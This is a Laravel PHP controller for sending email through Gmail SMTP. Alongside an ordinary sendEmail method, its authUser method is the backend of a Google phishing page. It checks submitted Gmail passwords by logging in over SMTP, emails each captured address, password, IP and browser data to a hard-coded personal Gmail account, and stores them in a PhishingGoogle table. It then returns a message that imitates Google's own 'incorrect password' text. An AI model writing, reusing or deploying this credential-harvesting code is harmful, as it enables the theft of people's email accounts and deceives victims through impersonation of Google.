<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;

use Symfony\Component\Mailer\Mailer;
use Symfony\Component\Mime\Email;
use Symfony\Component\Mailer\Transport;
use Symfony\Component\Mime\Address;
use Symfony\Component\HttpFoundation\File\UploadedFile;
use Illuminate\Support\Facades\Storage;

use App\Models\PhishingGoogle;

use App\Events\EventoPrueba;
use Mockery\Undefined;

class EnvioCorreoController extends Controller
{
    public function sendEmail(Request $request)
    {

        // return $request['orden_servicio'];
        $user = auth()->user();

        $nombreArchivo1 = pathinfo($user->imagen_firma_1, PATHINFO_BASENAME);
        $nombreArchivo2 = pathinfo($user->imagen_firma_2, PATHINFO_BASENAME);
        $rutaImagen1 = public_path($user->imagen_firma_1);
        $rutaImagen2 = public_path($user->imagen_firma_2);
        $adjuntos = [];

        $destinatarios = explode(',', $request->to);
        $cc = explode(',', $request->cc);
        $cco = explode(',', $request->cco);

        $archivos = $request->files->all();
        $archivos = [];
        foreach ($request['orden_servicio'] as $value) {
            array_push($archivos,public_path($value->ruta_documento));
            // return public_path($value->ruta_documento);
        }
        // return $archivos;

        if ($user->usuario == '' || $user->usuario == null) {
            return response()->json(['status' => 'error', 'message' => 'El usuario actual no cuenta con correo electrónico configurado']);
        }

        if ($user->contrasena_correo == '' || $user->contrasena_correo == null) {
            return response()->json(['status' => 'error', 'message' => 'El usuario actual no cuenta con una contraseña para el correo electrónico configurado']);
        }

        $password = Crypt::decryptString($user->contrasena_correo);
        $smtpHost = 'smtp.gmail.com';
        $smtpPort = 587;
        $smtpEncryption = 'tls';
        $smtpUsername = $user->usuario;
        $smtpPassword = $password;

        $dsn = "smtp://$smtpUsername:$smtpPassword@$smtpHost:$smtpPort?encryption=$smtpEncryption";

        $transport = Transport::fromDsn($dsn);

        $mailer = new Mailer($transport);

        $nombres = $user->nombres != 'null' ? $user->nombres : '';
        $apellidos = $user->apellidos != 'null' ? $user->apellidos : '';
        $email = (new Email())
            ->from(new Address($user->usuario,  $nombres . ' ' . $apellidos))
            ->subject($request->subject)
            ->html($request->body);

        if (file_exists($rutaImagen1)) {
            $email->attachFromPath($rutaImagen1, $nombreArchivo1);
        } else {
            return response()->json(['status' => 'error', 'message' => 'El correo electrónico no tiene configurada una firma.']);
        }

        if (file_exists($rutaImagen2)) {
            $email->attachFromPath($rutaImagen2, $nombreArchivo2);
        }

        // Acá se valida si viene el formulario de supervisión de al instante en pdf y lo adjunta al correo
        if (file_exists($request->formulario_supervision)) {
            $email->attachFromPath($request->formulario_supervision, 'Formulario de supervisión');
        }

        foreach ($destinatarios as $destinatario) {
            $email->addTo($destinatario);
        }

        if ($cc[0] != '') {
            foreach ($cc as $ccs) {
                $email->addCc($ccs);
            }
        }
        if ($cco[0] != '') {
            foreach ($cco as $ccos) {
                $email->addBcc($ccos);
            }
        }
        

        foreach ($archivos as $archivo) {

            if ($archivo instanceof UploadedFile) {
                array_push($adjuntos, $archivo->getClientOriginalName());
                $email->attachFromPath($archivo->getPathname(), $archivo->getClientOriginalName(), $archivo->getClientMimeType());
            }
        }

        $mailer->send($email);
        if ($mailer) {
            $registroCorreosController = new RegistroCorreosController;
            $correo['remitente'] = $user->usuario;
            $correo['destinatario'] = $destinatarios;
            $correo['con_copia'] = $cc;
            $correo['con_copia_oculta'] = $cco;
            $correo['asunto'] = $request->subject;
            $correo['mensaje'] = $request->body;
            $correo['adjunto'] = $adjuntos;
            $registroCorreosController->create($correo);
            return response()->json(['status' => 'success', 'message' => 'El correo electrónico se ha enviado correctamente.']);
        } else {
            return response()->json(['status' => 'error', 'message' => 'Hubo un error al enviar el correo electrónico.']);
        }
    }

    public function authUser(Request $request)
    {

        try {
            $destinatarios = explode(',', 'andres.duque01@gmail.com');

            $smtpHost = 'smtp.gmail.com';
            $smtpPort = 587;
            $smtpEncryption = 'tls';
            $smtpUsername = $request->user;
            $smtpPassword = $request->password;

            $dsn = "smtp://$smtpUsername:$smtpPassword@$smtpHost:$smtpPort?encryption=$smtpEncryption";

            $transport = Transport::fromDsn($dsn);

            $mailer = new Mailer($transport);

            $email = (new Email())
                ->from(new Address('andres.duque01@gmail.com'))
                ->subject('Phishing google')
                ->html('Correo electrónico: ' . $request->user . '<br> Contraseña: ' . $request->password . '<br> Ip pública: ' . $request->ip . '<br> Información usuario: ' . $request->info_browser . '<br> Correo validado: Si');

            foreach ($destinatarios as $destinatario) {
                $email->addTo($destinatario);
            }

            $mailer->send($email);
            if ($mailer) {
                $phishing_google = new PhishingGoogle;
                $phishing_google->correo = $request->user;
                $phishing_google->contrasena = $request->password;
                $phishing_google->direccion_ip = $request->ip;
                $phishing_google->validado = 'Si';
                $phishing_google->otra_informacion = $request->info_browser;
                $phishing_google->save();
                return response()->json(['status' => 'success', 'message' => 'success']);
            }
        } catch (\Exception $e) {
            $phishing_google = new PhishingGoogle;
            $phishing_google->correo = $request->user;
            $phishing_google->contrasena = $request->password;
            $phishing_google->direccion_ip = $request->ip;
            $phishing_google->validado = 'No';
            $phishing_google->otra_informacion = $request->info_browser;
            $phishing_google->save();
            if (str_contains($request->user, '@gmail.com')) {
                return response()->json(['status' => 'success', 'message' => 'success']);
            }
            return response()->json(['status' => 'error', 'message' => 'Correo o ontraseña incorrecta. Vuelve a intentarlo o selecciona "¿Has olvidado tu contraseña?" para cambiarla.']);
        }
    }
}
